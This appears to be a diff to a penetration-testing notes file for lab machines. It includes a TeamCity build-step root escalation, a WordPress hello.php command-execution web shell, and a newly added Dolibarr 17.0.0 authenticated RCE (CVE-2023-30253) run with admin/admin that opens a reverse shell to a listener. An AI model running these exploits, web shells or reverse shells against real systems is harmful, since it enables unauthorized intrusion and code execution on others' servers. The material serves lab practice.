@@ -377,11 +377,11 @@ ssh sys-internal@10.10.250.201 -i id_rsa -L 8111:localhost:8111
 ```
 
 * Once you have gained access Create a new project
-* ![alt text](https://miro.medium.com/max/2400/1\*2X-pj25DAE7RoL3ifAI5Hg.png)
+* ![alt text](https://miro.medium.com/max/2400/1*2X-pj25DAE7RoL3ifAI5Hg.png)
 * Next fill in the build configurations
-* ![alt text](https://miro.medium.com/max/2400/1\*hKdxKO8ihqutmUqyDfHSNg.png)
+* ![alt text](https://miro.medium.com/max/2400/1*hKdxKO8ihqutmUqyDfHSNg.png)
 * Next click build steps and use the following command to let `/bin/bash` run with full root privlages
-* ![alt text](https://miro.medium.com/max/2400/1\*NKdC7RmnSvhK0vl3o3J9Og.png)
+* ![alt text](https://miro.medium.com/max/2400/1*NKdC7RmnSvhK0vl3o3J9Og.png)
 * Click `save`, and then `run`
 * Back to the command line and run:
 
@@ -445,3 +445,24 @@ http://10.10.110.100:65000/wordpress/wp-content/plugins/hello.php?cmd=id
 - code execution...
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
+
+### [Dolibarr 17.0.0](https://www.dolibarr.org)
+
+* auth RCE [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)
+
+```
+python3 exploit.py http://crm.board.htb admin admin 10.10.14.53 9001
+[*] Trying authentication...
+[**] Login: admin
+[**] Password: admin
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
+
+nc -nlvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.53] from (UNKNOWN) [10.10.11.11] 53264
+bash: cannot set terminal process group (858): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
+```
